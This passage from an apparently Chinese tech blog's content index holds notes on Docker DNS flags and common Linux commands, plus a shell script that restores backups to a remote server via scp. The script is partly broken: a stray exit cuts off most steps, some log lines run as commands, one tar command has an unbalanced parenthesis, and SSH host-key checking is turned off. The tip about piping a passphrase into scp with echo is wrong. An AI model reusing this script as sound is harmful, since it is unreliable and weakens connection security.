$ docker run -it --rm ubuntu cat etc/resolv.conf
```

#### 2.单容器配置DNS

>  启动时配置

```ssh
$ docker run -it --rm -h host_ubuntu --dns=114.114.114.114 --dns-search=test.com ubuntu
```

```
 --rm  					Automatically remove the container when it exits 
 						容器退出时自动清理容器内部的文件系统。
 -h, --hostname string 	Container host name
 						设定容器的主机名，它会被写到容器内的 /etc/hostname 和 /etc/hosts
 --dns=IP_ADDRESS       Set custom DNS servers
 添加 DNS 服务器到容器的 /etc/resolv.conf 中，让容器用这个服务器来解析所有不在 /etc/hosts 中的主机名
 --dns-search=DOMAIN    Set custom DNS search domains
  设定容器的搜索域，当设定搜索域为 .example.com 时，在搜索一个名为 host 的主机时，DNS 不仅搜索 host，还会搜索 host.example.com。
```

```
ubuntu@ubuntu:~$ docker run -it --rm -h host_ubuntu --dns=114.114.114.114 --dns-search=test.com ubuntu
root@host_ubuntu:/# cat /etc/hostname 
host_ubuntu
root@host_ubuntu:/# cat /etc/hosts    
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.2	host_ubuntu
root@host_ubuntu:/# cat /etc/resolv.conf 
search test.com
nameserver 114.114.114.114

```









 https://httpd.apache.org/security/vulnerabilities_24.html 









]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux查询服务器硬件状态</title>
    <url>/2020/09/23/Linux%E6%9F%A5%E8%AF%A2%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%A1%AC%E4%BB%B6%E7%8A%B6%E6%80%81/</url>
    <content><![CDATA[
```shell
#! /bin/bash

echo 'CPU个数'
cat /proc/cpuinfo | grep "physical id" | uniq | wc -l
echo 'CPU核数'
cat /proc/cpuinfo | grep "cpu cores" | uniq
echo 'CPU型号'
cat /proc/cpuinfo | grep 'model name' |uniq


echo '内存大小'
cat /proc/meminfo | grep MemTotal

echo '查看内存使用量和交换区使用量'
free -m

echo '硬盘大小'
sudo fdisk -l | grep Disk

echo '系统版本'
head -n 1 /etc/issue
```

]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>PHP</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux常用命令详解</title>
    <url>/2021/06/12/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[
## 目录

cp 复制命令

tar 压缩命令

split 切分文件命令

scp 数据传输命令

df 查看硬盘空间状态

du 查看指定文件夹

wc 统计命令

## cp 复制命令

```
在linux中怎样用命令完全拷贝一个目录下的所有文件（包括隐藏文件以及文件夹）到另外一个目录下，并且使得被复制的所有文件的属性等完全保持不变？ 注意，连原来的文件夹中所有的文件的属性、链接等都不能更改。也就是说，要建立原来文件夹的一份一模一样的拷贝！&n

在linux中怎样用命令完全拷贝一个目录下的所有文件（包括隐藏文件以及文件夹）到另外一个目录下，并且使得被复制的所有文件的属性等完全保持不变？
注意，连原来的文件夹中所有的文件的属性、链接等都不能更改。
也就是说，要建立原来文件夹的一份一模一样的拷贝！

# cp -avx /home/* /mnt/newhome

功能: 复制文件或目录
说明: cp指令用于复制文件或目录，如同时指定两个以上的文件或目录，且最后的目的地是一个已经存在的目录，则它会把前面指定的所有文件或目录复制到此目录中。若同时指定多个文件或目录，而最后的目的地并非一个已存在的目录，则会出现错误信息
参数:
-a 或 --archive 此参数的效果和同时指定"-dpR"参数相同
-b 或 --backup 删除、覆盖目的文件先备份，备份的文件或目录亦建立为符号链接，并指向源文件或目录链接的源文件或目录。假如没有加上这个参数，在复制过程中若遇到符号链接，则会直接复制源文件或目录
-f 或 --force 强行复制文件或目录， 不论目的文件或目录是否已经存在
-i 或 --interactive 覆盖文件之前先询问用户
-l 或 --link 对源文件建立硬链接，而非复制文件
-p 或 --preserve 保留源文件或目录的属性，包括所有者、所属组、权限与时间
-P 或 --parents 保留源文件或目录的路径，此路径可以是绝对路径或相对路径，且目的目录必须已经丰在
-r 递归处理，将指定目录下的文件与子目录一并处理。若源文件或目录的形态，不属于目录或符号链接，则一律视为普通文件处理
-R 或 --recursive 递归处理，将指定目录下的文件及子目录一并处理
-s 或 --symbolic-link 对源文件建立符号链接，而非复制文件
-S <备份字尾字符串> 或 --suffix=<备份字尾字符串> 用"-b"参数备份目的文件后，备份文件的字尾会被加上一个备份字符串。默认的备份字尾符串是符号"~"
-u 或 --update 使用这项参数之后，只会在源文件的修改时间(Modification Time)较目的文件更新时，或是名称相互对应的目的文件并不存在，才复制文件
-v 或 --verbose 显示执行过程
-V <备份方式> 或 --version-control=<备份方式> 指定当备份文件时，备份文件名的命名方式，有以下3种:
1.numbered或t, 将使用备份编号，会在字尾加上~1~字符串，其数字编号依次递增
2.simple或never 将使用简单备份，默认的备份字尾字符串是~, 也可通过-S来指定
3.existing或nil将使用当前方式，程序会先检查是否存在着备份编号，若有则采用备份编号，若无则采用简单备份
-x 或 --one-file-system 复制的文件或目录存放的文件系统，必须与cp指令执行时所处的文件系统相同，否则不复制，亦不处理位于其他分区的文件
--help 显示在线帮助
--sparse=<使用时机> 设置保存希疏文件的时机
--version 显示版本

示例:
.复制文件，只有源文件较目的文件的修改时间新时，才复制文件
cp -u -v file1 file2

.将文件file1复制成文件file2
cp file1 file2

.采用交互方式将文件file1复制成文件file2
cp -i file1 file2

.将文件file1复制成file2，因为目的文件已经存在，所以指定使用强制复制的模式
cp -f file1 file2

.将目录dir1复制成目录dir2
cp -R file1 file2

.同时将文件file1、file2、file3与目录dir1复制到dir2
　　 cp -R file1 file2 file3 dir1 dir2

.复制时保留文件属性
cp -p a.txt tmp/

.复制时保留文件的目录结构
cp -P /var/tmp/a.txt ./temp/

.复制时产生备份文件
cp -b a.txt tmp/

.复制时产生备份文件，尾标 ~1~格式
cp -b -V t a.txt /tmp 

.指定备份文件尾标 
cp -b -S _bak a.txt /tmp
```

## tar 压缩命令

### 分卷压缩

举例：将10G大小的log文件2017.log打包压缩并分割成多个100m的文件

```
# 分卷压缩gz
# tar zcf - 2017.log |split -d -b 100m - logs.tar.gz.
# 生成文件： logs.tar.gz.00 logs.tar.gz.01
# 分卷压缩bz2
# tar jcf - 2017.log |split -d -b 100m - logs.tar.bz2.
# 生成文件： logs.tar.bz2.00 logs.tar.bz2.01
```

最后要提醒但是那两个”-”不要漏了，那是tar的ouput和split的input的参数

### 合并分卷解压缩

```
# 解压gz分卷
# cat logs.tar.gz* | tar zx
# 解压bz2分卷
# cat logs.tar.gz* | tar jx
```

### tar 命令简述

```
参数:
-j : 通过bzip2进行压缩\解压文件*.tar.bz2
-z : 通过gzip进行压缩\解压文件*.tar.gz
-c : 新建打包文件,可搭配-v来查看过程中被打包的文件名
-t : 查看打包文件的内容有哪些文件名
-x : 解压打包文件.
-v : 在压缩/解压过程中,显示正在处理的文件名
-f : -f后面接被处理的文件名
-C(大写) : 后接目录
-p : 保留备份数据的原本权限与属性
-P :	保留绝对路径,即允许备份数据中含有根目录存在的目录(危险)
常用:欲压缩或打包的文件或目录(/*)
bzip2压缩命令:tar -jcv -f boot.tar.bz2 /boot
gzip压缩命令 :tar -zcv -f boot.tar.gz  /boot
bzip2查看命令:tar -jtv -f /dir/*.tar.bz2
gzip 查看命令:tar -ztv -f /dir/*.tar.gz
bzip2解压缩命令:tar -jxv -f /dir/*.tar.bz2 -C 欲解压缩的目录
gzip解压缩命令 :tar -zxv -f /dir/*.tar.gz 欲解压缩的目录
特殊:
备份重要的系统数据,包括其完整的权限(-p参数):     tar -jcvp -f /root/etc.tar.bz2 /etc
只解压压缩文件内的其中一个文件:                          tar -jxv -f /root/etc.tar.bz2 etc/shadow
打包目录,但不含该目录下的某些文件(--exclude):
tar -jcv -f /root/system.tar.bz2  --exclude=root/etc* --exclude=root/system.tar.bz2 /etc /root
仅备份比某个时刻还要新的文件:
备份    :tar -jcv -f /root/etc.newer.2011.02.16.tar.bz2 –newer-mtime='2011-02-16' /etc/*
查看备份:tar -jtv -f etc.newer.2011.02.16.tar.bz2
注意:在备份文件的时候也备份它的父目录
```

## split 切分文件命令

功能说明：切割文件。
语法：

```
split [--help][--version][-<行数>][-b <字节>][-C <字节>][-l <行数>][要切割的文件][输出文件名
```

补充说明：split可将文件切成较小的文件，预设每1000行会切成一个小文件。
参数：
-<行数>或-l<行数> 指定每多少行就要切成一个小文件。
-b<字节> 指定每多少字就要切成一个小文件。支持单位:m,k
-C<字节> 与-b参数类似，但切割时尽量维持每行的完整性。
–help 显示帮助。
–version 显示版本信息。
[输出文件名] 设置切割后文件的前置文件名，split会自动在前置文件名后再加上编号。
例子：

### 1.按100KB的测试文件拆分

```
# split -b 10k date.file
# ls
date.file xaa xab xac xad xae xaf xag xah xai xaj
```

件被分割成多个带有字母的后缀文件，如果想用数字后缀可使用-d参数，同时可以使用-a length来指定后缀的长度：

```
# split -b 10k date.file -d -a 3
# ls
date.file x000 x001 x002 x003 x004 x005 x006 x007 x008 x009
```

为分割后的文件指定文件名的前缀：

```
# split -b 10k date.file -d -a 3 split_file
# ls
date.file split_file000 split_file001 split_file002 split_file003 split_file004 split_file005 split_file006 split_file007 split_file008 split_file009
```

### 2.按行数拆分

```
# split -l 10 date.file
```

## scp 数据传输命令

### 语法:

```
scp [-1246BCpqrv] [-c cipher] [-F ssh_config] [-i identity_file]
[-l limit] [-o ssh_option] [-P port] [-S program]
[[user@]host1:]file1 [...] [[user@]host2:]file2
```

### 参数

```
-1： 强制scp命令使用协议ssh1
-2： 强制scp命令使用协议ssh2
-4： 强制scp命令只使用IPv4寻址
-6： 强制scp命令只使用IPv6寻址
-B： 使用批处理模式（传输过程中不询问传输口令或短语）
-C： 允许压缩。（将-C标志传递给ssh，从而打开压缩功能）
-p：保留原文件的修改时间，访问时间和访问权限。
-q： 不显示传输进度条。
-r： 递归复制整个目录。
-v：详细方式显示输出。scp和ssh(1)会显示出整个过程的调试信息。这些信息用于调试连接，验证和配置问题。
-c cipher： 以cipher将数据传输进行加密，这个选项将直接传递给ssh。
-F ssh_config： 指定一个替代的ssh配置文件，此参数直接传递给ssh。
-i identity_file： 从指定文件中读取传输时使用的密钥文件，此参数直接传递给ssh。
-l limit： 限定用户所能使用的带宽，以Kbit/s为单位。
-o ssh_option： 如果习惯于使用ssh_config(5)中的参数传递方式，
-P port：注意是大写的P, port是指定数据传输用到的端口号
-S program： 指定加密传输时所使用的程序。此程序必须能够理解ssh(1)的选项。
```

### 使用

#### 从远端下载到本地

> 注意: 秘钥文件权限必须是600

```
格式:
scp -r -i [秘钥文件路径] -P [远端端口] -l [限速速度(kb/s)] [远端用户]@[远端IP]:[远端文件] [本地路径]
例如:
scp -r -v -p -i /home/ubuntu/file/id_rsa_2048 -P 22 -l 1000 [用户名]@[IP]:/home/xxx/windowsfonts /home/ubuntu/file
```

#### 从本地推送到远端

```
格式:
scp -r -i [秘钥文件路径] -P [远端端口] -l [限速速度(kb/s)] [本地上传文件路径] [远端用户]@[远端IP]:[远端保存路径]
例如:
scp -i /home/ubuntu/file/id_rsa_2048 -P 22 -l 1000 /home/ubuntu/file/TeamCity-2020.1.5.tar.gz [用户名]@[IP]:/home/xxx
```

即从远端下载数据可以用如下命令

```
echo [秘钥文件密码] | scp -i /home/ubuntu/file/id_rsa_2048 -P 22 -l 1000 /home/ubuntu/file/TeamCity-2020.1.5.tar.gz [用户名]@[IP]:/home/xxx
```

### 前提:

设置时区:

```
sudo cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
```

## df 查看硬盘空间状态

`df -h`

```
Filesystem      Size  Used Avail Use% Mounted on
udev            3.9G     0  3.9G   0% /dev
tmpfs           786M   84M  702M  11% /run
/dev/vda1        50G   37G  9.7G  80% /
tmpfs           3.9G   24K  3.9G   1% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           3.9G     0  3.9G   0% /sys/fs/cgroup
tmpfs           786M     0  786M   0% /run/user/500
/dev/vdb         99G   60M   94G   1% /var/www/Daily_Backup
172.17.0.12:/   1.1T  498G  563G  47% /var/www/Cloud_CFS
tmpfs           786M     0  786M   0% /run/user/1009

```

## du 查看指定文件夹

### 参数详解

- **-s**：对每个Names参数只给出占用的数据块总数。
- **-a**：递归地显示指定目录中各文件及子目录中各文件占用的数据块数。若既不指定-s，也不指定-a，则只显示Names中的每一个目录及其中的各子目录所占的磁盘块数。
- **-b**：以字节为单位列出磁盘空间使用情况（系统默认以k字节为单位）。
- **-k**：以1024字节为单位列出磁盘空间使用情况。
- **-c**：最后再加上一个总计（系统默认设置）。
- **-l**：计算所有的文件大小，对硬链接文件，则计算多次。
- **-x**：跳过在不同文件系统上的目录不予统计。
- **-h**：以K，M，G为单位，提高信息的可读性。

### 查看指定文件夹大小

`sudo du -sh /var/www/`

```
511G	/var/www/
```

### 查看当前目录大小

`du -sh`

```
1.8G	.
```

### 指定深度

`du -h / --max-depth=1`

### 排序

`du -h / --max-depth=1|sort -n`

### 前几个

`du -h / --max-depth=1|sort -n|head -5`

### 根目录文件夹大小

`sudo du -sh /*`

```
16M	/bin
751M	/boot
4.0K	/data
0	/dev
160M	/etc
1.8G	/home
0	/initrd.img
0	/initrd.img.old
3.5G	/lib
4.0K	/lib64
16K	/lost+found
8.0K	/media
4.0K	/mnt
47M	/opt
0	/proc
199M	/root
84M	/run
13M	/sbin
4.0K	/spare
4.0K	/srv
0	/sys
1.7G	/tmp
3.6G	/usr
523G	/var
0	/vmlinuz
0	/vmlinuz.old
```

## wc 统计命令

统计文件个数

```shell
ls -lR | grep "^-" |wc -l
ls -lR | grep "^d" | wc -l
```

]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>PHP</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell_文件恢复脚本</title>
    <url>/2021/07/25/Shell_%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[
## Shell文件恢复脚本

该脚本为快速恢复本地文件数据到指定服务器指定位置

### 配置文件目录:

 `config`

### 功能:

```
恢复本地文件数据到指定服务器指定位置, 交互型命令行输入
```

### 常用命令

```bash
sudo chmod 600 env/id_rsa_114
su root
./resolve.sh
```

### resolve.sh脚本

```shell
#! /bin/sh

# --------------------------方法区域-------------------------------------

# * [连接远端执行命令(使用秘钥文件_无密码)]
execOrigin(){
	echo "${current_time}ssh -i ${identify_file} -o StrictHostKeyChecking=no -p ${PORT} ${USER}@${IP} ${1}" >> "${2}"
	ssh -i "${identify_file}" -o StrictHostKeyChecking=no -p "${PORT}" "${USER}@${IP}" "${1}"
}

#/**
# * [使用scp传输文件到远端]
# * @parame ${1} [需要传输的文件清单]
# * @parame ${2} [最大尝试次数]
# */
scpRecover(){
	cat ${1} | while read LINE ; do
	    file_path=${LINE}
	    file_name=`basename ${LINE}`
		count_times=0
	    # 尝试最多三次拉取远端文件
	    while [ ${count_times} -lt ${2} ]; do
	        count_times=`expr ${count_times} + 1`
	        scp -r -v -p -i ${identify_file} -o StrictHostKeyChecking=no -P ${PORT} -l ${transfer_speed}  ${file_path} ${USER}@${IP}:${origin_tmp_dir}
	        cmd_result=$?
	        # 推送成功后跳出
	        if [ ${cmd_result} -eq 0 ]; then
	        	echo "${current_time}第${count_times}次推送数据${file_path}成功"
               	echo "${current_time}第${count_times}次推送数据${file_path}成功" >>  ${log_file}
                break
	        fi
	        sleep 5
	    done

	    # 判读是否成功移动,写入日志
	    if [ ${cmd_result} -eq 0 ]; then
	        echo "${current_time}推送文件到远端缓存目录 ${origin_tmp_dir} 成功"
	        echo "${current_time}推送文件到远端缓存目录 ${origin_tmp_dir} 成功"  >> ${log_file}
	    else
	        echo ${cmd_result} > ${dir_choice2}
	        ${current_time}推送文件到远端缓存目录 ${origin_tmp_dir}
	        ${current_time}推送文件到远端缓存目录 ${origin_tmp_dir}   >> ${log_file}
	    fi
	done
	if [ ! -f ${dir_choice2} ]; then
        touch ${dir_choice2}
	fi
	final_result=`cat ${dir_choice2}`
	rm -f ${dir_choice2}
	if [ "${final_result}" != '' ]; then
		echo "${IP}:${file_path}" "!!!${current_time}备份文件恢复有错误,请查看日志详情"
    else
    	echo "${IP}:${file_path}" "!!!${current_time}备份文件恢复成功"
	fi

}

#/**
# * [使用scp传输文件到远端]
# * @parame ${1} [需要传输的文件清单]
# * @parame ${2} [最大尝试次数]
# */
scpRecoverByPass(){
		count_times=0
    # 尝试最多三次推送远端文件
    while [ ${count_times} -lt ${2} ]; do
        count_times=`expr ${count_times} + 1`
        scp -r -v -p -o StrictHostKeyChecking=no -P ${PORT} -l ${transfer_speed} ${1} ${USER}@${IP}:${origin_tmp_dir}
        cmd_result=$?
        # 推送成功后跳出
        if [ ${cmd_result} -eq 0 ]; then
          echo "${current_time}第${count_times}次推送数据${1}成功"
              echo "${current_time}第${count_times}次推送数据${1}成功" >>  ${log_file}
              break
        fi
        sleep 5
    done

    # 判读是否成功移动,写入日志
    if [ ${cmd_result} -eq 0 ]; then
        echo "${current_time}推送文件到远端缓存目录 ${origin_tmp_dir} 成功"
        echo "${current_time}推送文件到远端缓存目录 ${origin_tmp_dir} 成功"  >> ${log_file}
    else
        echo ${cmd_result} > ${dir_choice2}
        ${current_time}推送文件到远端缓存目录 ${origin_tmp_dir}
        ${current_time}推送文件到远端缓存目录 ${origin_tmp_dir}   >> ${log_file}
    fi

	if [ ! -f ${dir_choice2} ]; then
     touch ${dir_choice2}
	fi
	final_result=`cat ${dir_choice2}`
	rm -f ${dir_choice2}
	if [ "${final_result}" != '' ]; then
		echo "${IP}:${1}" "!!!${current_time}备份文件恢复有错误,请查看日志详情"
    else
    	echo "${IP}:${1}" "!!!${current_time}备份文件恢复成功"
	fi

}




# --------------------------方法区域-------------------------------------

# [[ 定义公共参数 ]]
## 引入基础配置文件
. ./baseconfig
echo "使用本地备份文件目录: ${backfile}"
## 当前时间
current_time=`date "+%Y-%m-%d_%H:%M:%S"`

## 本地缓存文件
project_list=${current_time}project.txt
project_choiced=${current_time}choice.txt
file_choice=${current_time}file.txt
cmd_result=${current_time}cmd.txt
dir_choice2=${current_time}dir.txt
log_file=log.txt




## 创建缓存文件
if [ ! -f ${log_file} ]; then
        touch ${log_file}
fi
if [ ! -f ${dir_file} ]; then
        touch ${dir_file}
fi

# [[ 开始流程-用户自定选项 ]]
echo '欢迎使用图凌备份还原系统'

## 1.列出现有备份文件夹
echo "请选择你需要还原的备份"
count=1
find ${backfile} -maxdepth 1 -mindepth 1 -type d | while read line; do
	dirname=`basename ${line}`
	echo "${count}.${dirname}" > ${project_list}
	count=`expr ${count} + 1`
done
### 1.1空值判定(文件夹为空)
if [ ! -s ${project_list} ]; then
	echo "指定备份文件夹${backfile}没有备份文件,退出"
	rm -f ${project_list}
	exit 000001
fi
### 1.2输出备份文件夹内容
echo `cat ${project_list}`

## 2.依用户输入获取使用项目包名
read -p "输入要做恢复操作的项目备份包文件夹编号(数字) ## " index
line_index=${index}
### 2.1输入空值验证
if [ "${line_index}" = '' ]; then
  echo "输入编号不能为空"
  rm -f  ${project_list}
  exit 000002
fi
echo '输入字符为'${line_index}
### 2.2匹配输入编号对应项目
cat ${project_list} | while read project; do
	txt_index=`expr substr "${project}" 1 1`    # 获取字符串第一位
	txt_file=`expr substr "${project}" 3 300`   # 获取第三位到300位

	if [ "${line_index}" -eq "${txt_index}" ]; then
		echo ${txt_file} > ${project_choiced}
		break
	fi
done
#### 2.2.1回收缓存文件
rm -f  ${project_list}
### 2.3验证是否有匹配值
request_file=`cat ${project_choiced}`
if [ "${request_file}" = '' ]; then
	echo '请输入正确的编号'
	rm -f ${project_choiced}
	exit 000003
else
	echo "您选定的为${request_file}项目"
fi
#### 2.3.1回收缓存文件
rm -f ${project_choiced}

## 3.确认使用项目
read -p "是否确认使用该备份恢复项目(y默认/n) ## " confirm
if [ "${confirm}" = 'y' ] || [ "${confirm}" = 'Y' ] || [ "${confirm}" = '' ]; then
	back_project="${backfile}/${request_file}"
	echo "备份项目所在目录为${back_project}"
else
	echo '放弃使用,中断'
	exit 000004
fi

## 4.确认配置文件
project_file=${request_file}
config_file="config/${request_file}"
echo "该备份项目配置文件为: ${backfile}/${config_file}"
if [ ! -f ${config_file} ]; then
	echo '该项目没有默认配置文件,请创建后继续'
	exit 000005
fi
echo "引入配置文件:${project_file}"
. ${config_file}
## 4.1创建项目执行远端命令日志
log_record="${NAME}.txt"
if [ ! -f ${log_record} ]; then
  touch ${log_record}
fi

## 5.展示配置文件
default='n'

until [ "${default}" = 'y' ] || [ "${default}" = 'Y' ] || [ "${default}" = '' ]; do

	echo " # # # # # # # 该项目使用配置如下:"
	echo "------1.恢复目标: ${USER}@${IP}:${PORT}  使用身份秘钥: ${identify_file}"
	echo "------2.备份文件默认恢复到远端文件夹: ${back_up_file_path}"
	echo "------3.最大传输速度为: ${transfer_speed}kb/s"

  ### 5.1 确认是否使用默认配置
	read -p "是否使用当前配置(y默认/n) ## " default
  ### 5.2 自定义配置
	if [ "${default}" = 'y' ] || [ "${default}" = 'Y' ] || [ "${default}" = '' ]; then
		echo "${request_file}使用当前配置"
	else
		read -p "需要修改哪条配置(仅本次生效) ## " config_index
		if [ ${config_index} -eq 1 ]; then
			echo "修改恢复目标请配置config文件"
			read -p "请输入使用身份秘钥路径 > " id_file
			if [ "${id_file}" != '' ]; then
				identify_file=${id_file}
			fi
		elif  [ ${config_index} -eq 2  ]; then
			read -p "请输入远端恢复目标文件夹 > " origin_file
			if [ "${origin_file}" != '' ]; then
				back_up_file_path=${origin_file}
			fi
		elif  [ ${config_index} -eq 3  ]; then
			read -p "请输入最大传输速度 > " trans_speed
			if [ "${trans_speed}" != '' ]; then
				transfer_speed=${trans_speed}
			fi
		else
			echo '请输入正确的编号'
		fi
	fi
done
### 5.3展示修改后当前配置
echo "---------------------------------------------------------------------"
echo " 确认该项目使用配置如下:"
echo "1.恢复目标: ${USER}@${IP}:${PORT}  使用身份秘钥: ${identify_file}"
echo "2.备份文件默认恢复到远端文件夹: ${back_up_file_path}"
echo "3.最大传输速度为: ${transfer_speed}kb/s"
echo "---------------------------------------------------------------------"

# 6.判断需要全量恢复还是指定日期恢复
read -p "请选择恢复类型(1.全量(默认)/2.指定日期之前/3.指定日期之后) ## " recover_type

if [ "${recover_type}" = '1' ] || [ "${recover_type}" = '' ]; then
	rec_type="all"
elif [ "${recover_type}" = '2' ]; then
	read -p "请输入需要恢复多少天前的备份(纯数字天数) ## " pre_date
	if [ ${pre_date} -gt 0 ] 2>/dev/null; then
		echo "输入${recover_type}"
	else
		echo '输入格式错误'
		exit 000006
	fi
	rec_type="+${pre_date}"

elif [ "${recover_type}" = '3' ]; then
	read -p "请输入需要恢复多少天前的备份(纯数字天数) ## " aft_date
	if [ ${aft_date} -gt 0 ] 2>/dev/null; then
		echo "输入${recover_type}"
	else
		echo '输入格式错误'
		exit 000007
	fi
	rec_type="-${aft_date}"
else
	echo "输入${recover_type}不符合规则"
	exit 000010
fi
echo "恢复类型${rec_type}(参考find -ctime 命令)"

# 7.判断恢复是全部覆盖还是存在的文件不覆盖
echo "---------------------------------------------------------------------"
echo "---1.全部覆盖(默认)"
echo "---2.当目标文件不存在时才执行操作"
echo "---3.不要覆盖任何"
echo "---4.存在时,备份覆盖"
echo "---------------------------------------------------------------------"
read -p "请选择数据覆盖类型 ## " cover_type
if [ "${cover_type}" = '1' ] || [ "${cover_type}" = '' ]; then
	cover_type="-f"
elif [ "${cover_type}" = '2' ]; then
	cover_type="-f"
elif [ "${cover_type}" = '3' ]; then
	cover_type="-n"
elif [ "${cover_type}" = '4' ]; then
	cover_type="-b"
else
	echo "输入${cover_type}不符合规则"
	exit 000011
fi
echo "覆盖类型${cover_type}"

# 8.判断需要使用密码登录传输还是公钥文件传输
read -p "请选择连接类型(1.使用配置密钥（慢速）/2.密码登录（快速）) ## " link_type

if [ "${link_type}" = 1 ] || [ "${link_type}" = '' ]; then
  send_type='pubkey'
elif [ "${link_type}" = 2 ]; then
  send_type='pass'
else
  echo "输入${link_type}不符合规则"
	exit 000012
fi
echo "验证连接方式: ${send_type}"

# 9.执行备份文件传输
## 9.1 前置准备工作
### 9.1.1 测试远端命令是否执行成功
execOrigin "ls -ahl" "${log_record}"
if [ $? -ne 0 ]; then
    echo "远端命令不可用,无法连接,中断"
    exit 000013
fi
### 9.1.2 远端创建备份文件夹(大容量)
echo "创建远端缓存文件夹: ${mk_tmp_dir}"
origin_mk_tmp_dir="mkdir ${origin_tmp_dir}"
execOrigin "${origin_mk_tmp_dir}" "${log_record}"

exit

## 9.2 获取需要传输的文件(打包/清单)
project_dir=${back_project}

### 9.2.1 创建缓存文件夹
temp_tar="${request_file}${current_time}.tar" # 打包备份文件名: 项目名+时间.tar
temp_dir="${project_dir}/../../temp" # 打包备份文件夹
if [ ! -d ${temp_dir} ]; then
   mkdir ${temp_dir}
fi
### 9.2.2 打包/列出 需要回复的备份文件
if [ ${rec_type} = "all" ]; then
	find ${project_dir} -type f > ${file_choice}
	# 空值判定
  if [ ! -s ${file_choice} ]; then
    echo '指定日期没有备份文件,退出'
    rm -f ${file_choice}
    exit 000014
  fi
	if [ "${send_type}" = 'pass' ]; then
	  echo "---使用文件:"
	  echo `cat ${file_choice}`
	  echo "---创建压缩包: ${temp_dir}/${temp_tar}"
	  find ${project_dir} -type f | xargs tar -cvf "${temp_dir}/${temp_tar}"
	fi
else
	find ${project_dir} -type f -mtime ${rec_type} > ${file_choice}
	# 空值判定
  if [ ! -s ${file_choice} ]; then
    echo '指定日期没有备份文件,退出'
    rm -f ${file_choice}
    exit 000015
  fi
	if [ "${send_type}" = 'pass' ]; then
	  echo "---使用文件:"
	  echo `cat ${file_choice}`
	  echo "---创建压缩包: ${temp_dir}/${temp_tar}"
	  find ${project_dir} -type f -mtime ${rec_type} | xargs tar -cvf "${temp_dir}/${temp_tar}"
	fi
fi

## 9.3 传输文件到远端
if [ "${send_type}" = 'pass' ]; then
  echo "使用密码方式传输文件: ${temp_dir}/${temp_tar}"
  scpRecoverByPass "${temp_dir}/${temp_tar}" 3
  # 解压远端总包
  cmd_eject="cd ${origin_tmp_dir} && tar -xvpf ${temp_tar}) --force-local && rm -f ${temp_tar}"
  execOrigin "${cmd_eject}" "${log_record}"
  rm -f "${temp_dir}/${temp_tar}"
else
  echo "使用秘钥文件${identify_file}传输文件"
  scpRecover ${file_choice} 3
fi
## 9.3.1 解压远端文件
### 9.3.1.1 拼接解压命令
cmd_line="cd ${origin_tmp_dir}"
cat ${file_choice} | while read eachLine; do
	echo "待解压:${eachLine}"
	# 文件名
	file_name=`basename ${eachLine}`
	echo "文件名: ${file_name}"
	# 文件后缀
	file_ext=`expr "${file_name}" : '.*\(\..*\)'`
	echo "后缀名: ${file_ext}"
	if [ "${file_ext}" = '.tar' ]; then
		cmd_tar="tar -xvpf ${file_name} --force-local"
	elif [ "${file_ext}" = '.gz' ]; then
		cmd_tar="tar -xzvpf ${file_name} --force-local"
	elif [ "${file_ext}" = '.bz2' ]; then
		cmd_tar="tar -xjvpf ${file_name} --force-local"
	elif [ "${file_ext}" = '.Z' ]; then
		cmd_tar="tar –xZvpf ${file_name} --force-local"
	elif [ "${file_ext}" = '.rar' ]; then
		cmd_tar="unrar e ${file_name}"
	elif [ "${file_ext}" = '.zip' ]; then
		cmd_tar="unzip ${file_name}"
	else
		echo "未知格式${file_ext}"
		continue
	fi
	echo "日志文件: ${log_record}"
	echo "执行命令: ${cmd_tar}"
	echo "删除命令: rm -f ${file_name}"
	# 进入文件夹,解压文件
	cmd_line="${cmd_line} && ${cmd_tar}"
	# 删除原包
	cmd_line="${cmd_line} && rm -f ${file_name}"
	echo ${cmd_line} > ${cmd_result}
done
### 9.3.1.2 执行远端解压命令
cmd_total=`cat ${cmd_result}`
### 9.3.1.3 删除缓存文件
rm -f ${file_choice}
rm -f ${cmd_result}
echo "解压命令为: ${cmd_total}"
execOrigin "${cmd_total}" "${log_record}"

## 9.4 从缓存文件夹移动备份文件夹到源目录

echo "----------------正在覆盖文件到${back_up_file_path}----------------------"
# 创建文件夹
cmd_mkf="mkdir ${back_up_file_path}"
execOrigin "${cmd_mkf}" "${log_record}" 2>/dev/null # 创建新文件夹
# 移动文件到目标文件夹
config_lever=${package_level}
# cmd_move="mv ${cover_type} ${origin_tmp_dir}${config_lever}/* ${back_up_file_path}/"
cmd_move="cp -rf ${origin_tmp_dir}/${config_lever}/* ${back_up_file_path}/"
execOrigin "${cmd_move}" "${log_record}"
#cmd_remove="rm -rf ${origin_tmp_dir}"
#execOrigin "${cmd_remove}" "${log_record}"
echo "------------------- 文件恢复完毕,ENJOY ---------------------------------"
```

### config配置文件

```
backfile='/var/www/File'
```

### config/[项目名] 配置文件

```
# 远端配置
NAME='测试服数据恢复'         # 项目名称
USER='ubuntu'                   # 用户名
IP='xxx.xxx.xxx.xxx'            # IP地址
PORT='22'                       # 端口
# 功能配置
identify_file='./env/id_rsa_114'                # 登录公钥文件
transfer_speed='2000000'                           # 最大传输速度 kb/s
# 项目文件配置
origin_tmp_dir='/var/www/tmp'
back_up_file_path='/var/www/[项目名]/uploadfiles1'                # 远端备份路径
package_level='[压缩包内文件名,可多层]'                                     # 包层级

```



]]></content>
      <categories>
        <category>实际演练</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
